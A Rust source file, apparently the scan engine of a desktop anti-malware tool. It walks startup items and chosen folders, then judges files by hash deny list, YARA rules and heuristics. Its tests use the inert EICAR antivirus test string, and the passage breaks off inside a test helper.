//! Walking the machine and turning files into findings.
//!
//! The order of work is the design. A scan collects candidates first, because
//! knowing *how many* there are is what makes an honest progress bar and a
//! coverage statement possible; then it judges them, cheapest test first —
//! extension filter, then size/identity cache, then hash, then YARA, then
//! heuristics. Nothing is hashed twice in one scan, and a file whose size and
//! modification time match what the previous scan recorded re-uses its stored
//! verdict, which is what keeps a second quick scan in seconds rather than
//! minutes.
//!
//! One invariant outranks speed: a scan never removes, moves, renames or chmods
//! anything. It reads, and it reports. Everything that touches the disk lives in
//! [`crate::quarantine`], behind a decision the user made about a finding id.

use crate::coverage::{self, Coverage, RootOutcome};
use crate::findings::{Confidence, Evidence, Finding};
use crate::heuristics;
use crate::rules::{Detector, HashIndex};
use crate::store::{FileIdentity, Hit, ScanCache};
use serde::{Deserialize, Serialize};
use squid_core::paths;
use squid_core::progress::{CancelToken, Progress};
use squid_platform::startup::{StartupInventory, StartupItem};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::time::{Instant, SystemTime, UNIX_EPOCH};

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ScanMode {
    /// The places something has to be running from: login entries and what
    /// they point at, applications, browser extensions, and the folders a browser
    /// writes into.
    Quick,
    /// Everything Quick covers plus the user's home tree. Always explicit.
    Full,
    /// Paths the user picked.
    Custom,
}

impl ScanMode {
    pub fn as_str(self) -> &'static str {
        match self {
            ScanMode::Quick => "quick",
            ScanMode::Full => "full",
            ScanMode::Custom => "custom",
        }
    }

    /// The wall-clock expectation shown next to the button before a scan starts.
    pub fn estimate(self) -> &'static str {
        match self {
            ScanMode::Quick => "under a minute on a healthy cache",
            ScanMode::Full => "minutes, depending on how much is in your home folder",
            ScanMode::Custom => "as long as the paths you chose",
        }
    }
}

/// What the caller asked to be scanned.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ScanTarget {
    Quick,
    Full,
    Paths(Vec<String>),
}

impl ScanTarget {
    pub fn mode(&self) -> ScanMode {
        match self {
            ScanTarget::Quick => ScanMode::Quick,
            ScanTarget::Full => ScanMode::Full,
            ScanTarget::Paths(_) => ScanMode::Custom,
        }
    }
}

/// One finished scan.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ScanReport {
    pub scan_id: String,
    pub mode: ScanMode,
    pub finished_ms: u64,
    pub elapsed_ms: u64,
    pub cancelled: bool,
    pub findings: Vec<Finding>,
    pub coverage: Coverage,
    /// Files offered to the detectors, after the extension and size filters.
    pub examined: usize,
    /// Files whose verdict came from the cache instead of a fresh hash.
    pub cached: usize,
    /// Files skipped: too big, a symbolic link, or filtered by extension.
    pub skipped: usize,
    /// The system-protection advisories collected before walking anything.
    pub system_advisories: Vec<Finding>,
}

impl ScanReport {
    pub fn confirmed(&self) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.confidence == Confidence::Confirmed && !finding.ignored)
            .count()
    }

    pub fn suspicious(&self) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.confidence == Confidence::Suspicious && !finding.ignored)
            .count()
    }

    pub fn advisory(&self) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.confidence == Confidence::Advisory && !finding.ignored)
            .count()
    }

    /// Nothing found, and nothing skipped: the only state that lets the UI say a
    /// plain "clean".
    pub fn clean_and_complete(&self) -> bool {
        self.findings.is_empty() && self.coverage.complete() && !self.cancelled
    }
}

/// What one scan reached, before the counts and coverage are folded in.
struct ReportParts {
    scan_id: String,
    mode: ScanMode,
    started: Instant,
    cancelled: bool,
    findings: Vec<Finding>,
    coverage: Coverage,
    examined: usize,
    cached: usize,
}

/// Everything a scan needs, assembled once per run.
pub struct ScanContext<'a> {
    pub detector: &'a Detector,
    pub hashes: &'a HashIndex,
    pub startup: &'a StartupInventory,
    pub cache: &'a mut ScanCache,
    /// Paths the user excluded, already expanded.
    pub exclusions: Vec<PathBuf>,
    /// Files larger than this are reported by size alone and never hashed.
    pub max_file_bytes: u64,
    /// Whether the login-item inventory is part of this scan. True for the
    /// built-in ranges, false for a custom one.
    pub include_startup: bool,
}

/// The largest file a quick scan will read. A 40 GB VM image in `~/Downloads`
/// is not a malware candidate, and reading it would cost more than everything
/// else in the scan put together.
pub const QUICK_FILE_LIMIT: u64 = 256 * 1024 * 1024;
pub const FULL_FILE_LIMIT: u64 = 2 * 1024 * 1024 * 1024;

/// Run one scan.
///
/// Progress goes to the same channel the cleanup engines use, so the desktop
/// layer relays both kinds of job the same way. Cancellation is checked in the
/// collector and in the judge loop, which means a cancel lands within one file.
pub fn run(
    target: &ScanTarget,
    context: &mut ScanContext,
    progress: &Progress,
    cancel: &CancelToken,
) -> Result<ScanReport, squid_core::SquidError> {
    let started = Instant::now();
    let scan_id = new_scan_id();
    let mode = target.mode();

    progress.phase("prepare", "reading login items and system protection");
    let mut candidates: Vec<Candidate> = Vec::new();
    let mut coverage = Coverage::default();

    // Startup entries come first: they are few, they are the most likely place a
    // persistence mechanism hides, and they tell the file walk which programs are
    // already known to run at login.
    //
    // A custom scan leaves them out. Pointing squid at one folder is asking
    // about that folder, and answers from the rest of the machine buried in the
    // same list would make the result unreadable. Startup entries have their own
    // surface, in the app and in `squid guard startup`.
    let startup_items: Vec<StartupItem> = if context.include_startup {
        startup_candidates(context.startup)
    } else {
        Vec::new()
    };
    for item in &startup_items {
        candidates.push(Candidate::from_startup(item));
    }
    if context.include_startup {
        coverage.record_walk(
            Path::new(if cfg!(windows) {
                "registry:Run"
            } else {
                "launchd:plist"
            }),
            RootOutcome::Walked,
            None,
            context.startup.items.len(),
            startup_items.len(),
        );
    }

    for root in roots_for(target) {
        if cancel.is_cancelled() {
            return Ok(finished(ReportParts {
                scan_id,
                mode,
                started,
                cancelled: true,
                findings: Vec::new(),
                coverage,
                examined: 0,
                cached: 0,
            }));
        }
        let label = paths::pretty(&root);
        progress.phase("collect", label.clone());
        let walk = collect(&root, mode, context, mode == ScanMode::Custom);
        match walk {
            Ok(Walked { files, skipped }) => {
                let scanned = files.len();
                let total = files.len() + skipped;
                coverage.record_walk(&root, RootOutcome::Walked, None, total, scanned);
                for path in files {
                    candidates.push(Candidate::from_path(path, context.startup));
                }
            }
            Err((outcome, reason)) => {
                coverage.record_walk(&root, outcome, Some(reason), 0, 0);
            }
        }
    }

    // Deduplicate: a login item's target is also inside `/Applications`, and one
    // file reported twice with half the evidence each is worse than one row.
    let candidates = merge_candidates(candidates);
    let total = candidates.len();
    progress.tick(0, Some(total as u64), None);

    let mut findings: Vec<Finding> = Vec::new();
    let mut examined = 0_usize;
    let mut cached_hits = 0_usize;
    let mut skipped = 0_usize;
    let mut merged: HashMap<String, usize> = HashMap::new();

    // Split borrow: the detectors are read while the verdict cache is written.
    let ScanContext {
        detector,
        hashes,
        startup,
        cache,
        exclusions,
        max_file_bytes,
        include_startup: _,
    } = context;

    for (index, candidate) in candidates.iter().enumerate() {
        if index % 32 == 0 && cancel.is_cancelled() {
            let mut report = finished(ReportParts {
                scan_id: scan_id.clone(),
                mode,
                started,
                cancelled: true,
                findings,
                coverage,
                examined,
                cached: cached_hits,
            });
            report.skipped = skipped + (total - index);
            return Ok(report);
        }
        let path = &candidate.path;
        if is_excluded(path, exclusions) {
            continue;
        }
        let Some(metadata) = read_metadata(path) else {
            continue;
        };
        if metadata.len() > *max_file_bytes {
            skipped += 1;
            continue;
        }
        examined += 1;
        // Ticked whether or not the cache answers, not only on a miss: a second
        // scan of an unchanged machine is almost entirely hits, and a progress bar
        // that never moves during the one scan the user is actually watching looks
        // like a scan that has stopped. Throttled because the channel is unbounded
        // and each tick carries a path — every file would mean fifty thousand
        // allocations to describe a bar that is read sixty times a second.
        if index % 24 == 0 || index + 1 == total {
            progress.tick(index as u64, Some(total as u64), Some(path.clone()));
        }

        let identity = FileIdentity::of(path, &metadata);
        let hit = match cache.verdict(&identity) {
            Some(hit) => {
                cached_hits += 1;
                hit
            }
            None => {
                let judged = judge_file(
                    path,
                    metadata.len(),
                    detector,
                    hashes,
                    startup,
                    candidate.startup.as_ref(),
                );
                // Remembering is what makes the second scan fast, so it happens
                // before the evidence is moved out of the verdict.
                cache.remember(&identity, judged.clone());
                judged
            }
        };
        let Hit {
            evidence,
            sha256,
            signed,
        } = hit;
        if evidence.is_empty() {
            continue;
        }
        let confidence = strongest(&evidence, detector);
        let key = format!(
            "{}|{}",
            confidence.as_str(),
            paths::normalized(path).display()
        );
        if let Some(existing) = merged.get(&key) {
            let slot = &mut findings[*existing];
            for item in evidence {
                if !slot.evidence.iter().any(|kept| kept.key() == item.key()) {
                    slot.evidence.push(item);
                }
            }
            slot.confidence = slot.confidence.max(confidence);
            continue;
        }
        merged.insert(key, findings.len());
        // Who signed it is the expensive half of the signature question, and it
        // is only asked of files that survived every filter to become a finding.
        // A full scan narrows tens of thousands of files to a handful, so this
        // runs a few times per scan instead of once per file examined.
        let publisher = squid_platform::trust::assess(path).signer;
        findings.push(build_finding(
            &scan_id,
            findings.len(),
            path,
            Verdict {
                confidence,
                evidence,
                sha256,
                signed,
                publisher,
                size: metadata.len(),
            },
        ));
    }

    cache.commit();
    findings.sort_by(|a, b| {
        b.confidence
            .cmp(&a.confidence)
            .then_with(|| a.name.to_lowercase().cmp(&b.name.to_lowercase()))
    });

    let advisories_from: &[StartupItem] = if context.include_startup {
        &context.startup.items
    } else {
        &[]
    };
    let system_advisories = crate::heuristics::startup_advisories(advisories_from)
        .into_iter()
        .filter_map(|(path, name, level, evidence)| {
            let key = format!("{}|{}", level.as_str(), paths::normalized(&path).display());
            if merged.contains_key(&key) {
                return None;
            }
            Some(
                build_finding(
                    &scan_id,
                    findings.len() + 1_000,
                    &path,
                    Verdict {
                        confidence: level,
                        evidence,
                        sha256: None,
                        signed: false,
                        publisher: None,
                        size: 0,
                    },
                )
                .with_name(name),
            )
        })
        .collect();

    let mut report = finished(ReportParts {
        scan_id,
        mode,
        started,
        cancelled: false,
        findings,
        coverage,
        examined,
        cached: cached_hits,
    });
    report.skipped = skipped;
    report.system_advisories = system_advisories;
    if !report.coverage.complete() {
        for gap in report.coverage.gaps() {
            let _ = gap;
        }
    }
    Ok(report)
}

fn finished(parts: ReportParts) -> ScanReport {
    let ReportParts {
        scan_id,
        mode,
        started,
        cancelled,
        findings,
        coverage,
        examined,
        cached,
    } = parts;
    ScanReport {
        scan_id,
        mode,
        finished_ms: now_ms(),
        elapsed_ms: started.elapsed().as_millis() as u64,
        cancelled,
        findings,
        coverage,
        examined,
        cached,
        skipped: 0,
        system_advisories: Vec::new(),
    }
}

/// One file plus what the startup inventory says about it.
struct Candidate {
    path: PathBuf,
    /// The entry that starts this file, when there is one.
    startup: Option<StartupItem>,
}

impl Candidate {
    fn from_path(path: PathBuf, startup: &StartupInventory) -> Self {
        let startup = path.to_str().and_then(|_| {
            startup
                .items
                .iter()
                .find(|item| item.program.as_deref() == Some(path.as_path()))
                .cloned()
        });
        Candidate { path, startup }
    }

    fn from_startup(item: &StartupItem) -> Self {
        Candidate {
            path: item
                .program
                .clone()
                .unwrap_or_else(|| PathBuf::from(&item.id)),
            startup: Some(item.clone()),
        }
    }
}

/// Resolve each entry's target, including the binary inside an `.app`.
fn startup_candidates(inventory: &StartupInventory) -> Vec<StartupItem> {
    let mut out: Vec<StartupItem> = Vec::new();
    for item in &inventory.items {
        if item.system_vendor {
            continue;
        }
        out.push(item.clone());
    }
    out
}

struct Walked {
    files: Vec<PathBuf>,
    skipped: usize,
}

/// Collect candidate files under one root. Only files whose extension could
/// carry code are kept, which is what keeps a home-folder walk to a few percent
/// of its entries.
/// `roots_are_targets` marks the roots a custom scan was pointed at. Inside
/// those the extension gate is lifted: a person who picks a file or a folder is
/// asking about what is there, and refusing to look at `eicar.com` because it
/// does not end in `.exe` would make the feature answer a different question
/// than the one was asked.
fn collect(
    root: &Path,
    mode: ScanMode,
    context: &ScanContext,
    roots_are_targets: bool,
) -> Result<Walked, (RootOutcome, String)> {
    if context
        .exclusions
        .iter()
        .any(|skip| paths::same_path(skip, root))
    {
        return Err((RootOutcome::Excluded, "excluded in Settings".into()));
    }
    let entries = match std::fs::read_dir(root) {
        Ok(entries) => entries,
        Err(error) => {
            let outcome = coverage::outcome_for_error(&error);
            let reason = if outcome == RootOutcome::Absent {
                "not present".into()
            } else {
                error.to_string()
            };
            return Err((outcome, reason));
        }
    };
    let _ = entries;

    // Depth is capped rather than unbounded: a symlink loop or a deeply nested
    // build tree should cost a note, not the scan.
    const MAX_DEPTH: usize = 12;
    const MAX_FILES: usize = 400_000;
    let mut files = Vec::new();
    let mut skipped = 0_usize;
    let mut stack: Vec<(PathBuf, usize)> = vec![(root.to_path_buf(), 0)];
    while let Some((dir, depth)) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let file_type = match entry.file_type() {
                Ok(file_type) => file_type,
                Err(_) => continue,
            };
            if coverage::is_never_scanned(&path) || is_excluded(&path, &context.exclusions) {
                skipped += 1;
                continue;
            }
            if file_type.is_dir() {
                // `.app` bundles are walked: the executable inside is the file
                // that matters, and macOS will not let us judge the folder.
                if depth < MAX_DEPTH {
                    stack.push((path, depth + 1));
                } else {
                    skipped += 1;
                }
                continue;
            }
            if file_type.is_symlink() {
                // Following links is how a scan ends up outside the roots it
                // promised to stay inside.
                skipped += 1;
                continue;
            }
            // The gate runs in two stages because the two halves cost different
            // amounts. The name is already in hand and rejects most of a million
            // walked entries for free; only what survives it is stat'ed, which is
            // where size and the execute bit settle the rest. Measured on a real
            // home folder this is the difference between examining ~17,000 files
            // and examining ~900,000 of them.
            if !crate::rules::plausible_by_name_in(&path, roots_are_targets) {
                skipped += 1;
                continue;
            }
            let Ok(metadata) = entry.metadata() else {
                skipped += 1;
                continue;
            };
            if !crate::rules::worth_scanning_in(&path, &metadata, roots_are_targets) {
                skipped += 1;
                continue;
            }
            // A quick scan is the persistence surface: what starts at login, what
            // a browser runs, and what a browser has just been handed. The inside
            // of an application bundle is only judged down to the bundle's own
            // executable, because an app's frameworks and resources are the
            // vendor's problem, and walking all of them is what makes a "quick"
            // scan read ten gigabytes.
            if mode == ScanMode::Quick && !roots_are_targets && !quick_scope_allows(&path) {
                skipped += 1;
                continue;
            }
            files.push(path);
            if files.len() >= MAX_FILES {
                return Ok(Walked { files, skipped });
            }
        }
    }
    Ok(Walked { files, skipped })
}

/// Whether a quick scan reads one file that has already passed the name and
/// `stat` gates.
///
/// The roots a quick scan walks *are* the persistence surface — launchd
/// directories, the folders a browser writes to, application support — so
/// outside a bundle everything that survives the gates is in scope. Inside a
/// bundle only the bundle's own executable and its `Info.plist` are, because the
/// frameworks, resources and archives behind them belong to the vendor, and
/// reading them is what turns a scan that takes seconds into one that takes
/// most of ten minutes.
fn quick_scope_allows(path: &Path) -> bool {
    match bundle_layout(path) {
        None => true,
        Some(depth) => matches!(depth, BundleDepth::MainExecutable | BundleDepth::InfoPlist),
    }
}

/// How deep a file sits inside an application bundle.
#[derive(PartialEq, Eq)]
enum BundleDepth {
    /// `Foo.app/Contents/MacOS/Foo` — the program the bundle actually runs.
    MainExecutable,
    /// `Foo.app/Contents/Info.plist` — the declaration that names it.
    InfoPlist,
    /// Anything else under `Contents`: frameworks, resources, helpers, archives.
    Interior,
}

/// Locate a file relative to the bundle that owns it, if any.
///
/// Written against the components rather than a lowercased string so that a
/// folder merely named `Contents` — which does happen in support directories —
/// is not mistaken for a bundle, and so that a bundle buried at any depth
/// (`/Applications/Thing.app/Contents/Helpers/Other.app/…`) is still recognised.
fn bundle_layout(path: &Path) -> Option<BundleDepth> {
    let parts: Vec<String> = path
        .components()
        .map(|part| part.as_os_str().to_string_lossy().to_ascii_lowercase())
        .collect();
    // The owner is the innermost bundle whose `Contents` the path actually
    // enters, so a helper bundle inside another bundle is measured against
    // itself and keeps its own executable in scope.
    let owner = (0..parts.len()).rev().find(|index| {
        parts[*index].ends_with(".app")
            && parts.get(*index + 1).map(String::as_str) == Some("contents")
    })?;
    match parts.len() - owner - 2 {
        // Directly inside `Contents`.
        1 if parts[parts.len() - 1] == "info.plist" => Some(BundleDepth::InfoPlist),
        // One folder deeper, and that folder is the executable directory.
        2 if parts[parts.len() - 2] == "macos" => Some(BundleDepth::MainExecutable),
        _ => Some(BundleDepth::Interior),
    }
}

/// The places a quick scan covers. Kept short on purpose: these are the
/// locations a program can be started from, not every file on the disk.
pub fn quick_roots() -> Vec<PathBuf> {
    let home = squid_platform::startup::home_dir();
    let mut roots = vec![
        PathBuf::from("/Applications"),
        home.join("Applications"),
        home.join("Downloads"),
        home.join("Desktop"),
        home.join("Library/Application Support"),
        home.join("Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
        PathBuf::from("/Library/Application Support"),
    ];
    if cfg!(windows) {
        if let Ok(local) = std::env::var("LOCALAPPDATA") {
            roots.push(PathBuf::from(local));
        }
        if let Ok(program_files) = std::env::var("ProgramFiles") {
            roots.push(PathBuf::from(program_files));
        }
        if let Ok(appdata) = std::env::var("APPDATA") {
            roots.push(PathBuf::from(appdata));
        }
    }
    roots
}

pub fn full_roots() -> Vec<PathBuf> {
    let home = squid_platform::startup::home_dir();
    let mut roots = quick_roots();
    let user_tree = home.join("Library");
    if !roots.contains(&user_tree) {
        roots.push(user_tree);
    }
    if cfg!(not(windows)) {
        roots.push(home.join("Documents"));
        roots.push(home.join("Pictures"));
        roots.push(home.join("Movies"));
    }
    roots
}

fn roots_for(target: &ScanTarget) -> Vec<PathBuf> {
    match target {
        ScanTarget::Quick => quick_roots(),
        ScanTarget::Full => full_roots(),
        ScanTarget::Paths(values) => values
            .iter()
            .map(|value| {
                let expanded = paths::expand(value);
                if expanded.is_dir() {
                    expanded
                } else if expanded.is_file() {
                    expanded
                        .parent()
                        .map(Path::to_path_buf)
                        .unwrap_or_else(squid_platform::startup::home_dir)
                } else {
                    expanded
                }
            })
            .collect(),
    }
}

fn is_excluded(path: &Path, exclusions: &[PathBuf]) -> bool {
    exclusions
        .iter()
        .any(|skip| paths::same_path(skip, path) || paths::is_within(skip, path))
}

fn read_metadata(path: &Path) -> Option<std::fs::Metadata> {
    let metadata = std::fs::symlink_metadata(path).ok()?;
    if metadata.is_file() && !metadata.file_type().is_symlink() {
        Some(metadata)
    } else {
        None
    }
}

/// The bytes one file is judged on, read once.
///
/// Hashing and YARA both want the content, and reading a candidate twice was the
/// largest single cost in a full scan: a scan is bounded by disk throughput, not
/// CPU, so a second pass over the same bytes doubles the time for nothing.
struct ReadBytes {
    bytes: Vec<u8>,
    /// False when a large file was cut to head and tail windows, so the middle
    /// was never seen.
    complete: bool,
}

/// Files at or below this are read whole; above it a head and a tail window are
/// taken, which is where an appended or packed payload usually sits.
const FULL_READ_LIMIT: u64 = 64 * 1024 * 1024;
const WINDOW: usize = 8 * 1024 * 1024;

impl ReadBytes {
    fn of(path: &Path, size: u64) -> Option<ReadBytes> {
        use std::io::{Read, Seek, SeekFrom};
        let mut file = std::fs::File::open(path).ok()?;
        if size <= FULL_READ_LIMIT {
            let mut bytes = Vec::with_capacity(size as usize);
            file.read_to_end(&mut bytes).ok()?;
            return Some(ReadBytes {
                bytes,
                complete: true,
            });
        }
        let mut bytes = Vec::with_capacity(WINDOW * 2);
        file.by_ref()
            .take(WINDOW as u64)
            .read_to_end(&mut bytes)
            .ok()?;
        if file.seek(SeekFrom::End(-(WINDOW as i64))).is_ok() {
            let _ = file.read_to_end(&mut bytes);
        }
        Some(ReadBytes {
            bytes,
            complete: false,
        })
    }

    fn sha256(&self) -> String {
        use sha2::{Digest, Sha256};
        hex::encode(Sha256::digest(&self.bytes))
    }
}

/// Judge one file, from a single read.
///
/// The SHA-256 is only reported when the read covered the whole file. A denied
/// hash is a claim about every byte, so publishing the digest of a head-and-tail
/// window as "the file's hash" would let a later quarantine compare against a
/// number no other tool can reproduce.
fn judge_file(
    path: &Path,
    size: u64,
    detector: &Detector,
    hashes: &HashIndex,
    startup_inventory: &StartupInventory,
    startup: Option<&StartupItem>,
) -> Hit {
    let Some(reading) = ReadBytes::of(path, size) else {
        return Hit {
            evidence: Vec::new(),
            sha256: None,
            signed: false,
        };
    };
    let mut evidence: Vec<Evidence> = Vec::new();

    // Cost order: a hash is cheap and conclusive, YARA is the work, and the
    // heuristics only speak about files the published detectors left alone.
    let hash = reading.sha256();
    if reading.complete {
        if let Some(denied) = hashes.check(&hash) {
            evidence.push(denied);
        }
    }
    let reported_hash = reading.complete.then_some(hash);

    let denied = evidence
        .iter()
        .any(|item| matches!(item, Evidence::DeniedHash { .. }));
    if !denied {
        evidence.extend(detector.scan_buffer(&reading.bytes));
    }

    let signed = squid_platform::trust::has_signature_blob(path);
    let confirmed = denied
        || evidence.iter().any(|item| match item {
            Evidence::YaraRule { rule, .. } => {
                detector.level_of(rule) == crate::rules::RuleLevel::Signature
            }
            _ => false,
        });
    if !confirmed {
        let entry = startup.or_else(|| {
            startup_inventory
                .items
                .iter()
                .find(|item| item.program.as_deref() == Some(path))
        });
        let candidate = heuristics::Candidate {
            path,
            startup: entry,
            world_writable: world_writable(path),
            // The cheap question: does a signature exist at all. Validating the
            // chain costs a subprocess per file on macOS, and a signature that
            // exists but does not chain is not what this filter is looking for.
            signed,
        };
        let heuristic = heuristics::judge(&candidate);
        // An unsigned file in an ordinary folder, with nothing else to say about
        // it, would list half the machine; keep it only where it matters.
        let worth_listing = entry.is_some()
            || path.starts_with(squid_platform::startup::home_dir().join("Downloads"))
            || heuristic.iter().any(|item| {
                !matches!(
                    item,
                    Evidence::Unsigned { .. } | Evidence::StartsAtLogin { .. }
                )
            });
        if worth_listing {
            evidence.extend(heuristic);
        }
    }
    heuristics::dedupe(&mut evidence);
    Hit {
        evidence,
        sha256: reported_hash,
        signed,
    }
}

/// Whether any user of this machine could replace the file.
fn world_writable(path: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path)
            .map(|metadata| metadata.permissions().mode() & 0o002 != 0)
            .unwrap_or(false)
    }
    #[cfg(not(unix))]
    {
        let _ = path;
        false
    }
}

fn strongest(evidence: &[Evidence], detector: &Detector) -> Confidence {
    // Two questions, answered in two places and then combined, because they are
    // genuinely different questions. What a *published* detector says is taken at
    // its own level: a known-bad hash is confirmed, a behaviour rule is not. What
    // the *heuristics* say is graded by [`heuristics::confidence`], which counts
    // how many signals corroborate rather than taking the loudest one — no
    // heuristic may reach confirmed whatever the combination, so the ceiling
    // applies to that half only.
    let published = evidence
        .iter()
        .filter(|item| {
            matches!(
                item,
                Evidence::DeniedHash { .. } | Evidence::YaraRule { .. }
            )
        })
        .map(|item| match item {
            Evidence::DeniedHash { .. } => Confidence::Confirmed,
            Evidence::YaraRule { rule, .. } => detector
                .confidence_for(std::slice::from_ref(item))
                .max(match detector.level_of(rule) {
                    crate::rules::RuleLevel::Signature => Confidence::Confirmed,
                    crate::rules::RuleLevel::Behaviour => Confidence::Suspicious,
                }),
            _ => Confidence::Advisory,
        })
        .max()
        .unwrap_or(Confidence::Advisory);
    published.max(heuristics::confidence(evidence))
}

/// Bundle of what one file's judgement produced, so the row builder does not
/// take eight positional arguments.
struct Verdict {
    confidence: Confidence,
    evidence: Vec<Evidence>,
    sha256: Option<String>,
    signed: bool,
    publisher: Option<String>,
    size: u64,
}

fn build_finding(scan_id: &str, index: usize, path: &Path, verdict: Verdict) -> Finding {
    let Verdict {
        confidence,
        evidence,
        sha256,
        signed,
        publisher,
        size,
    } = verdict;
    let name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.display().to_string());
    let title = evidence
        .iter()
        .find_map(|item| match item {
            Evidence::DeniedHash { threat, .. } => Some(threat.clone()),
            Evidence::YaraRule { family, rule, .. } => Some(if family == "behaviour" {
                rule.clone()
            } else {
                family.clone()
            }),
            _ => None,
        })
        .unwrap_or_else(|| name.clone());
    Finding {
        id: format!("{scan_id}#{index}"),
        confidence,
        path: Some(path.to_path_buf()),
        display_path: Some(paths::pretty(path)),
        name,
        title,
        description: evidence
            .iter()
            .map(Evidence::summary)
            .collect::<Vec<_>>()
            .join("; "),
        evidence,
        size,
        sha256,
        signed,
        publisher,
        found_at_ms: now_ms(),
        quarantined: false,
        ignored: false,
    }
}

impl Finding {
    fn with_name(mut self, name: String) -> Self {
        self.name = name;
        self
    }
}

fn merge_candidates(candidates: Vec<Candidate>) -> Vec<Candidate> {
    // Indexed by canonical path. Comparing against the list already accepted was
    // quadratic, and the comparison allocates a component vector each time: a
    // quick scan of ~16,000 files spent more time de-duplicating paths than
    // reading the files it was about to judge.
    let mut seen: HashMap<String, usize> = HashMap::with_capacity(candidates.len());
    let mut out: Vec<Candidate> = Vec::with_capacity(candidates.len());
    for candidate in candidates {
        let key = paths::canonical_key(&candidate.path);
        match seen.get(&key) {
            Some(existing) => {
                // Keep the copy that knows more: a startup entry explains itself.
                if candidate.startup.is_some() && out[*existing].startup.is_none() {
                    out[*existing].startup = candidate.startup;
                }
            }
            None => {
                seen.insert(key, out.len());
                out.push(candidate);
            }
        }
    }
    out
}

fn new_scan_id() -> String {
    let mut seed = now_ms();
    let mut bytes = [0_u8; 8];
    for byte in bytes.iter_mut() {
        seed = seed
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        *byte = (seed >> 33) as u8;
    }
    format!(
        "{}-{}",
        now_ms(),
        hex::encode(bytes).chars().take(10).collect::<String>()
    )
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|since| since.as_millis() as u64)
        .unwrap_or_default()
}

/// An owning scan context, so the CLI and the desktop app build a scan the same
/// way and cannot drift apart on what "a scan" means.
///
/// The rule set is the built-in floor plus the best installed pack. A pack that
/// fails to compile alongside the built-ins is dropped rather than retried,
/// because the built-ins are the part that must always work.
pub struct Guard {
    detector: Detector,
    hashes: HashIndex,
    pub startup: StartupInventory,
    pub cache: ScanCache,
    pub exclusions: Vec<PathBuf>,
    pub max_file_bytes: u64,
    /// False when an installed pack was rejected and only the built-ins are live.
    pub pack_active: bool,
}

impl Guard {
    pub fn new(exclusions: Vec<PathBuf>) -> Guard {
        let mut pack_active = false;
        let detector = match crate::intel::installed_pack() {
            Some(pack) => {
                let extra = vec![(pack.source.clone(), pack.manifest.rules.clone())];
                match Detector::with_extra(&extra) {
                    Ok(detector) => {
                        pack_active = true;
                        detector
                    }
                    Err(_) => Detector::builtin().expect("built-in rules compile"),
                }
            }
            None => Detector::builtin().expect("built-in rules compile"),
        };
        Guard {
            detector,
            hashes: HashIndex::builtin(),
            startup: squid_platform::startup::inventory(),
            cache: ScanCache::new(),
            exclusions,
            max_file_bytes: QUICK_FILE_LIMIT,
            pack_active,
        }
    }

    pub fn rule_count(&self) -> usize {
        self.detector.rule_count()
    }

    pub fn hash_count(&self) -> usize {
        self.hashes.len()
    }

    /// Run one scan with this guard's rules, cache and exclusions.
    ///
    /// The fields are destructured rather than reached through `&self` because
    /// the scan reads the detectors while writing the verdict cache, and those
    /// two borrows have to be disjoint.
    pub fn scan(
        &mut self,
        target: &ScanTarget,
        progress: &Progress,
        cancel: &CancelToken,
    ) -> Result<ScanReport, squid_core::SquidError> {
        self.max_file_bytes = if target.mode() == ScanMode::Quick {
            QUICK_FILE_LIMIT
        } else {
            FULL_FILE_LIMIT
        };
        let exclusions = self.exclusions.clone();
        let max_file_bytes = self.max_file_bytes;
        let Guard {
            detector,
            hashes,
            startup,
            cache,
            ..
        } = self;
        let mut context = ScanContext {
            detector,
            hashes,
            startup,
            cache,
            exclusions,
            max_file_bytes,
            include_startup: !matches!(target, ScanTarget::Paths(_)),
        };
        let report = run(target, &mut context, progress, cancel);
        // Commit even when the scan was cancelled or failed: the verdicts it did
        // reach are still true, and throwing them away makes the next scan slow.
        context.cache.commit();
        report
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::quarantine::Quarantine;
    use std::io::Write;

    const EICAR: &str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n";

    struct Fixture {
        root: PathBuf,
    }

    impl Fixture {
        fn new(tag: &str) -> Fixture {
            let root = std::env::temp_dir().join(format!("squid-scan-{tag}"));
            let _ = std::fs::remove_dir_all(&root);
            std::fs::create_dir_all(&root).unwrap();
            Fixture { root }
        }

        fn write(&self, relative: &str, bytes: &[u8]) -> PathBuf {
            let path = self.root.join(relative);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            let mut file = std::fs::File::create(&path).unwrap();
            file.write_all(bytes).unwrap();
            path
        }

        /// A sibling folder, outside the scanned root, for tests about scope.
        fn sibling(&self, name: &str) -> PathBuf {
            let dir = self.root.parent().unwrap().join(format!(
                "{}-outside",
                self.root.file_name().unwrap().to_string_lossy()
            ));
            let path = dir.join(name);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::File::create(&path)
                .unwrap()
                .write_all(b"#!/bin/sh\n")
                .unwrap();
            path
        }

        fn cleanup(&self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    /// A scan target takes paths the way a person or the frontend would type
    /// them, so the fixture converts before asking.
    fn strings_for(paths: &[PathBuf]) -> Vec<String> {
        paths
            .iter()
            .map(|path| path.to_string_lossy().into_owned())
            .collect()
    }

    /// Scan a fixture tree by path, with nothing cached and no exclusions.
    fn scan_paths(paths: &[PathBuf]) -> ScanReport {
        let inventory = StartupInventory::default();
        let detector = Detector::builtin().expect("built-in rules compile");
        let hashes = HashIndex::builtin();
